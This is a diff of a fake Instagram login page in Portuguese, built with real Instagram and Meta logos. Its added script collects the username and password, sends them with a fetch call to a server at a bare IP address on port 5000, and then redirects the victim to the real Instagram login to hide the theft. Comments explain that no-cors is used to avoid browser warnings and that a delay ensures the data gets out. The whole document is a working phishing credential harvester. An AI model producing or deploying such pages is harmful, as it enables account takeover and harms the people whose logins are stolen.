@@ -5,55 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
+        /* Estilos mantidos conforme sua imagem */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #121e26; color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; padding: 0 25px; }
-        .language-top { position: absolute; top: 20px; color: #a8a8a8; font-size: 12px; }
-        .main-content { width: 100%; max-width: 375px; display: flex; flex-direction: column; align-items: center; }
+        .main-content { width: 100%; max-width: 375px; display: flex; flex-direction: column; align-items: center; margin-top: -30px; }
         .logo-container { margin-bottom: 40px; }
         .instagram-icon { width: 62px; height: 62px; }
         .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
         .login-form input { width: 100%; height: 52px; background: #1c2b33; border: 1px solid #36464f; border-radius: 12px; padding: 0 16px; font-size: 14px; color: #ffffff; outline: none; }
         .login-btn { background-color: #1864f7; color: white; border: none; border-radius: 25px; height: 44px; font-size: 15px; font-weight: 600; margin-top: 6px; cursor: pointer; }
-        .forgot-link { text-align: center; font-size: 14px; margin-top: 18px; color: #ffffff; text-decoration: none; font-weight: 500; }
-        .footer-actions { width: 100%; margin-top: 40px; display: flex; flex-direction: column; align-items: center; gap: 12px; }
-        .create-account-btn { width: 100%; height: 44px; background: transparent; border: 1px solid #1864f7; border-radius: 25px; color: #1864f7; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .footer-actions { width: 100%; margin-top: 60px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .create-account-btn { width: 100%; height: 44px; background: transparent; border: 1px solid #36464f; border-radius: 25px; color: #1864f7; font-size: 14px; font-weight: 600; cursor: pointer; }
         .meta-logo { width: 65px; opacity: 0.8; margin-top: 10px; }
+        #loadingOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(18, 30, 38, 0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .spinner { width: 30px; height: 30px; border: 3px solid #36464f; border-top: 3px solid #ffffff; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="language-top">Português (Brasil)</div>
-    <div class="main-content">
-        <div class="logo-container">
-            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" class="instagram-icon">
-        </div>
+    <div id="loadingOverlay"><div class="spinner"></div></div>
 
-        <form class="login-form" action="http://15.228.223.163:5000/login" method="POST" id="loginForm">
-            <input type="text" name="user" id="username" placeholder="Nome de usuário, email ou celular" required>
-            <input type="password" name="pass" id="password" placeholder="Senha" required>
-            
-            <input type="hidden" name="enc_password" id="enc_password">
-            <input type="hidden" name="userAgent" id="userAgent">
-            
-            <button type="submit" class="login-btn">Entrar</button>
-            <a href="#" class="forgot-link">Esqueceu a senha?</a>
+    <div class="main-content">
+        <div class="logo-container"><img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" class="instagram-icon"></div>
+
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" placeholder="Nome de usuário, email ou celular" required>
+            <input type="password" id="password" placeholder="Senha" required>
+            <button type="submit" class="login-btn" id="btnEntrar">Entrar</button>
+            <p style="text-align: center; font-size: 14px; margin-top: 15px;">Esqueceu a senha?</p>
         </form>
 
         <div class="footer-actions">
-            <button type="button" class="create-account-btn">Criar nova conta</button>
+            <button class="create-account-btn">Criar nova conta</button>
             <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" class="meta-logo">
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').onsubmit = function() {
-            const pass = document.getElementById('password').value;
-            const ts = Math.floor(Date.now() / 1000);
+        const BACKEND_URL = "http://15.228.223.163:5000/login";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            // Preenche os campos ocultos antes do envio do formulário
-            document.getElementById('enc_password').value = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${pass}`;
-            document.getElementById('userAgent').value = navigator.userAgent;
-            return true;
-        };
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const overlay = document.getElementById('loadingOverlay');
+            
+            overlay.style.display = 'flex';
+
+            const payload = {
+                user: user,
+                pass: pass,
+                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Math.floor(Date.now() / 1000)}:${pass}`,
+                userAgent: navigator.userAgent
+            };
+
+            // Usamos 'keepalive' para garantir que a requisição seja enviada antes do redirecionamento
+            try {
+                fetch(BACKEND_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Evita o erro de segurança visual no navegador
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    keepalive: true 
+                });
+            } catch (e) { }
+
+            // Redireciona após um pequeno delay para garantir o envio
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 1000);
+        });
     </script>
 </body>
 </html>
